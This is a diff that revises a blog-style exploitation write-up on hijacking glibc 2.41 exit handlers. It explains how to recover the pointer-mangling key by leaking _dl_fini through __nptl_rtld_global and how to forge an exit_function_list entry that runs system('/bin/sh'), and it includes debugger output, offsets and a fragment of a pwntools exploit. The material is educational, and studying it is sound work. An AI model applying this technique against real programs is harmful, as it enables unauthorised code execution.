@@ -29,22 +29,64 @@ During my research, I ended up using two sources that would ultimately help me b
 
 It may also help to look at [exit.h](https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h) and [exit.c](https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c) from the LibC source code. LibC 2.41 is used here, but the concept should make sense for most other versions >= 2.41
 
-As seen from the `exit.h` and `exit.c` code:
-1. There exists an `__exit_funcs` address which is a pointer to an `exit_function_list` struct. The struct being pointed to, as per the type, is a singly linked list, storing at most 32 `exit_function` structs.
-1. Looking at the source code for `exit()`, the function is literally just a wrapper to `__run_exit_handlers()`, just automatically filling in all the internal data for us.
-1. The `__run_exit_handlers` function interprets each `exit_function`, and ultimately executes it in multiple different ways according to the `flavor` enum/int value.
+```c {script_name="exit.h"}
+struct exit_function
+{
+  /* `flavour' should be of type of the `enum' above but since we need
+     this element in an atomic operation we have to use `long int'.  */
+  long int flavor;
+  union
+    {
+void (*at) (void);
+struct
+  {
+    void (*fn) (int status, void *arg);
+    void *arg;
+  } on;
+struct
+  {
+    void (*fn) (void *arg, int status);
+    void *arg;
+    void *dso_handle;
+  } cxa;
+    } func;
+};
 
-Seems great, right? We essentially just have some form of RCE right there for us. So, as a result, we can do the following:
-1. Generate some `exit_function_list` struct (call it "A"), with it containing an `exit_function` of our choosing
+struct exit_function_list
+{
+  struct exit_function_list *next;
+  size_t idx;
+  struct exit_function fns[32];
+};
+
+extern struct exit_function_list *__exit_funcs attribute_hidden;
+```
+
+As seen from above, `__exit_funcs` is just a pointer to an `exit_function_list` struct. The struct being pointed to, as per the type, is a singly linked list, storing at most 32 `exit_function` structs within each entry.
+
+Looking at the source code for `exit()`, the function is literally just a wrapper to `__run_exit_handlers()`, just automatically filling in all the internal data for us.
+
+```c {script_name="exit.c"}
+void exit (int status)
+{
+  __run_exit_handlers (status, &__exit_funcs, true, true);
+}
+libc_hidden_def (exit)
+```
+
+The `__run_exit_handlers` function executed here, for the sake of brevity, interprets each `exit_function`, and ultimately executes it in multiple different ways according to the `flavor` enum/int value. This, essentially, is just intentional code execution.
+
+Seems great right? Here's an example of what can be done:
+1. Generate some `exit_function_list` node (call it `A`), with it containing an `exit_function` of our choosing.
 	* Recommended to use the `ef_cxa` (4) enum value for `flavor`, as the actual function to execute is interpreted as `func(void* ptr, int status)`. This makes it possible to do `system("/bin/sh")` due to the first value being treated as a pointer, and system only takes one parameter anyway.
-1. Place the address of A into `__exit_funcs` (since `__exit_funcs` is a pointer *to* the struct)
+1. Somehow write to `__exit_funcs` and have it point to our malicious node, thus executing our code.
 1. Pwned
 
 But, enough with the theoretical side of things; let's get to the practicalities.
 
 ## Day in the Life of an Exit Function
 
-Sparing the extra details of heap exploitation and whatnot, let's make a simple program with all protections enabled.
+Sparing the extra details of heap exploitation and whatnot, let's make a simple program just to be a wrapper for this behavior.
 
 ```c {script_name="example.c"}
 #include <stdlib.h>
@@ -106,13 +148,12 @@ pwndbg> x/8xg __exit_funcs
 0x7ffff7f98ff0 <initial+48>:    0x0000000000000000      0x0000000000000000
 ```
 
-We can see that the actual struct is located at `inital`. We see the following:
-1. The first 8 bytes are the number 0, or NULL, meaning that this is the end of the `exit_functions_list` linked-list
-1. The second 8 bytes are the number 1, meaning this is the first (and last) node in the list
-1. The third and fourth 16 bytes are a single `exit_function`, with the first of the pair being 4 (the flavor; `ef_cxa`, corresponding to the enum), and the last being the actual function.
+We can see that the actual struct is located at an exported symbol named `initial`.
+1. The first 8 bytes, `NULL` in this case, is the "next" pointer in the linked list. Since this is the first and only node, there is nothing to go to, so it's empty.
+1. The second 8 bytes is the `size_t` corresponding to the `idx` (index) of this current node. It is `0x1`, AKA, the first node in the list.
+1. The later values after this are all just pointers to `exit_function` structures.
 
-However, something's odd. The function should be a valid function...this doesn't look like an actual function. Why?
-
+However, something's odd here. One of the exit functions in this list doesn't seem like a valid function address. Why?
 
 ### Pointer Guard
 
@@ -167,9 +208,7 @@ This is great! Now all we need to do is subtract the LibC base address from the 
 True
 ```
 
-### Calculating \_dl\_fini from an ld.so base address leak
-
-Do you see it? The address we leaked is bigger than the last address of the `libc.so.6` address space. This means `_dl_fini` isn't actually in `libc.so.6`, meaning it isn't at a fixed offset.
+The address of `_dl_fini` is **outside** the address space of `libc.so.6`! This means a `libc.so.6` leak just isn't good enough, since the space between address spaces is randomized and thus unpredictable.
 
 So, where does it belong to?
 
@@ -188,44 +227,53 @@ So, where does it belong to?
 True
 ```
 
-As we can see, surprisingly enough, the address we leaked is within the address space of `ld.so`. So...for the first time in, probably, ever, of my binex career..we'll need to find a leak to `ld.so`.
+Unlike most times where a function we want can be easily obtained by merely a libc leak, it looks like `_dl_fini` is rather instead belonging to `ld.so`.
+
+### Calculating \_dl\_fini from an ld.so base address leak
 
 Now, this is rather unorthodox. Normally you're used to leaking out PIE addresses of the binary itself or LibC addresses. How in the world do we obtain an `ld.so` leak? Much less from LibC?
 
-Well, the answer is rather simple. There's another address we can look at: `_rtld_global`.
+Well, the answer is rather simple. There's alot of links between LibC and `ld.so`, but one of the simpler things I found was an exported symbol `__nptl_rtld_global`:
 
 ```as
-pwndbg> x/xg &_rtld_global
-0x7ffff7ffd000 <_rtld_global>:  0x00007ffff7ffe2e0
+pwndbg> p __nptl_rtld_global
+$2 = (struct rtld_global *) 0x7ffff7ffd000 <_rtld_global> 
 ```
 
-```python
->>> 0x7ffff7fc8000 < 0x00007ffff7ffe2e0 < 0x7ffff7fff000
-True
+`_rtld_global` is a [structure](https://elixir.bootlin.com/glibc/glibc-2.41/source/elf/rtld.c#L320) which exists in `ld.so`.
+
+In LibC, `__nptl_rtld_global`, shown [here](https://elixir.bootlin.com/glibc/glibc-2.41/source/nptl/pthread_create.c#L64), links to this `_rtld_global` in `ld.so`, thus giving us an address in `ld.so`.
+
+With our LibC leak, we can simply read from the `__nptl_rtld_global` pointer and get the address of `_rtld_global`, ultimately getting our `ld.so` leak.
+
+I decided to use one of the entries within `_rtld_global`, not the table itself, but ultimately this is arbitrary; as long as it is within `ld.so` it will be just fine.
+
+```as
+pwndbg> x/4xg __nptl_rtld_global
+0x7ffff7ffd000 <_rtld_global>:  0x00007ffff7ffe2e0      0x0000000000000004
+0x7ffff7ffd010 <_rtld_global+16>:       0x00007ffff7ffe5d8      0x0000000000000000
 ```
 
-In short, `_rtld_global` itself doesn't matter; what does matter is that this is a link between LibC and `ld.so`. The actual `_rtld_global` struct itself is created and stored in the `ld.so` address space, while LibC's `_rtld_global` is essentially a pointer to this very struct.
-
-This means we can essentially read out the value from LibC's `_rtld_global` to get an address in the `ld.so` address space, and thus, be able to get the `ld.so` base address.
-
-In my exploit and demonstration from hereon out, I did not properly understand this struct, so I'll be using the first address *inside* the `_rtld_global` (in `ld.so`) struct (0x7ffff7ffe2e0). However, using the actual `_rtld_global` address itself (0x7ffff7ffd000) is also fine, as it also belongs in the `ld.so` memory space.
-
-Now, we can go ahead and do the following:
-1. Calculate the (consistent) offset between the leaked address and the current `ld.so` base address from GDB:
-	* `0x00007ffff7ffe2e0 - 0x7ffff7fc8000 = 0x362e0`
-1. Calculate the offset between the `_dl_fini` function and the base address of `ld.so` (again, from GDB):
-	* `0x7ffff7fcbe20 - 0x7ffff7fc8000 = 0x3e20`
-1. Whenever we leak the address again, subtract offset 0x362e0 to obtain the current `ld.so` base address
-1. Add offset 0x3e20 to the base address to obtain `_dl_fini`
-1. XOR this `_dl_fini` address with the leaked encrypted address (after it's been shifted right 17 times) to obtain the XOR key
-
-And there we go, we've now managed to systematically figure out the XOR key! We're able to bypass pointer mangling now.
+More specifically, the first 8 bytes, `0x00007ffff7ffe2e0`, is what I decided to go through with.
 
 ## Creating our very own EF
 
 Now that everything's in place to bypass protections, and overall our understanding of exit functions is adequate, let's go ahead and create our exit function.
 
-Remember that, in our case, using flavor `ef_cxa` is best given the format `func(void* arg, int status)`, since we intend our RCE to be a nice and simple `system("/bin/sh")`.
+We will do the following:
+1. Get a LibC leak somehow
+1. Leak out, from `__exit_funcs`, the ciphertext of `PTR_MANGLE` XOR `_dl_fini_address`. Call this `_dl_fini_enc`.
+1. Leak out this address shown above from `__nptl_rtld_global`, lets call it `A`.
+1. In GDB, calculate the consistent offset between some `A` and its corresponding `ld.so` base. Use this offset to get any `ld.so` from any arbitrary `A`.
+	* `0x00007ffff7ffe2e0 - 0x7ffff7fc8000 = 0x362e0 = offset_A`
+1. Perform the same as the above, this time with `_dl_fini` to get *its* consistent offset from the `ld.so` address space start.
+	* `0x7ffff7fcbe20 - 0x7ffff7fc8000 = 0x3e20 = offset_dl_fini`
+1. In the actual exploit, leak out some `A`.
+1. Perform `A - offset_A` to get `ld_so_base_address`
+1. Perform `ld_so_base_address + offset_dl_fini` to get the address of `_dl_fini` for that current binary.
+1. Undo the shifting operations, and then, knowing `_dl_fini_enc` and `_dl_fini`, perform `_dl_fini_enc` XOR `_dl_fini` to get the pointer guard XOR key.
+1. Modify `__exit_funcs` in any valid way such that it points to a malicious exit function we constructed.
+	* Remember that, in our case, using flavor `ef_cxa` is best given the format `func(void* arg, int status)`, since we intend our RCE to be a nice and simple `system("/bin/sh")`.
 
 Since we have access to the heap, our goal is to allocate an entire `exit_function_list` struct and replace the value of `__exit_funcs` to that instead. Let's understand what we actually need to create.
 
@@ -326,7 +374,7 @@ with process(["./vuln_poc"]) as p:
 	log.info(f"Encrypted address: {hex(enc_addr)}")
 
 	#leak _rtld_global to get the ld.so base address
-	rtld_global_addr = interact("r", {"addr": libc.sym["_rtld_global"]})
+	rtld_global_addr = interact("r", {"addr": libc.sym["__nptl_rtld_global"]})
 
 	#dereference rtld_global 
 	rtld_global_addr = interact("r", {"addr": rtld_global_addr})
